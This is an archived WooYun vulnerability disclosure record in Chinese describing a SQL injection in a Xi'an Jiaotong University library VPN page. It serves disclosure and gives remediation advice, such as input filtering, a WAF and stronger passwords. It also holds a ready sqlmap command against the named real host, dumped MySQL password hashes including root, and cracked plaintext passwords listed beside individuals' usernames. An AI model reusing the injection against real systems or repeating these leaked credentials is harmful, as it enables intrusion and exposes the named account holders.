{"id": 52840, "wybug_id": "wooyun-2014-069962", "wybug_title": "西安交通大学远程访问SQL注入漏洞", "wybug_corp": "西安交通大学", "wybug_author": "路人甲", "wybug_date": "2014-07-28 10:35", "wybug_open_date": "2014-09-11 10:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "数据库账户权限过高"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-11：\t细节向公众公开  简要描述： 西安交通大学远程访问SQL注入漏洞，可获取到相关内网VPN账号密码 详细说明：  注入点http://vpn.lib.xjtu.edu.cn/www/index.php?controller=VpnIndex&action=See&announceid=21参数为announceid加个单引号之后直接报错，可以看到是mysql的数据库\n\n直接丢到sqlmap终端中执行sqlmap -u \"http://vpn.lib.xjtu.edu.cn/www/index.php?controller=VpnIndex&action=See&announceid=21\" -p \"announceid\" --dbms \"mysql\" --dbs\n\n库名，可以看到是以root权限运行的跑一下mysql这个库\n\n| User     | Password         |+----------+------------------+| <blank>  | <blank>          || <blank>  | <blank>          || chaoxing | 76bd738b31bb6586 |  cxwxs| chaoxing | 76bd738b31bb6586 |  cxwxs| root     | 4173b5be72fa3995 |  未解出| root     | <blank>          || root     | 67457e226a1a15bd |  root| test     | 378b243e220ca493 |  test| vpntest  | 11f269162b01eab1 |  未解出+----------+------------------+在后面的测试中，还发现了很多个人信息，包括管理员信息等等For Example\n\n\n\n\n\n随手解了几个MD5，看起来真是胆战心惊啊abao--------ybcaiqin------caiqinchenbin-----cb123456chenxinan---ybdingding----521121gaowenli----bgsgongmanli---ybliguiying---56784321lijuan------971206guowei------613213命中率如此之高，密码位数不多，复杂程度不够，为破解带来了极大的便利，同时也为黑客入侵带来了极大的便利···   漏洞证明：  \n\n| User     | Password         |+----------+------------------+| <blank>  | <blank>          || <blank>  | <blank>          || chaoxing | 76bd738b31bb6586 |  cxwxs| chaoxing | 76bd738b31bb6586 |  cxwxs| root     | 4173b5be72fa3995 |  未解出| root     | <blank>          || root     | 67457e226a1a15bd |  root| test     | 378b243e220ca493 |  test| vpntest  | 11f269162b01eab1 |  未解出+----------+------------------+\n\n\n\n\n\nabao--------ybcaiqin------caiqinchenbin-----cb123456chenxinan---ybdingding----521121gaowenli----bgsgongmanli---ybliguiying---56784321lijuan------971206guowei------613213   修复方案：  不仅仅是要补上SQL注入这个一个漏洞，从这一个漏洞可以反映出相关人员安全意识普遍不高，未能做相关的安全防护，在边界区域最起码的软WAF都没有，此等重要数据线放在边界上实为不妥，等于是把自己家的东西拱手给别人，如果真有有心人利用这些信息最一些什么，后果，损失真是无法想象。所以就我个人意见提几个修复办法0x01 修补SQL注入楼度，加入常见的过滤0x02 如有相关支持，建议安装硬件WAF，如无法安装硬件，可考虑下载软WAF（e.g.安全狗，加速乐，360之类的）0x03 对于密码设置方面加入一定的条件判断，例如必须包含数字+字母，位数不得少于8位等都0x04 如果条件允许的话，建议将该服务器线路迁移至内网防火墙的trust域，对外只做接口，统一接入整体管理平台进行管理0x05 如果可以的话，给相关人员打好预防针，做好相关的网络安全方面的工作就这么多吧，言过之处，还请谅解，   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-07-28 11:06 厂商回复： 通知用户处理中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}